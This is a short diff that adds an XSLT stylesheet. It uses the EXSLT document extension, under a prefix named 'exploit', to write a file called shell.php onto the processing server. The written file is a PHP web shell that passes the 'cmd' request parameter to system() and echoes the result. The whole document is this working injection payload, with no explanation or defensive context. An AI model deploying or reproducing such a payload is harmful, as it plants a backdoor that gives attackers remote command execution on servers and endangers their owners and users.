@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:exploit="http://exslt.org/common" 
+  extension-element-prefixes="exploit"
+  version="1.0">
+  
+  <xsl:template match="/">
+    <exploit:document href="shell.php" method="text">
+      <![CDATA[
+        <?php
+        if(isset($_GET['cmd'])){
+            echo "<pre>";
+            system($_GET['cmd']);
+            echo "</pre>";
+        }
+        ?>
+      ]]>
+    </exploit:document>
+  </xsl:template>
+</xsl:stylesheet>
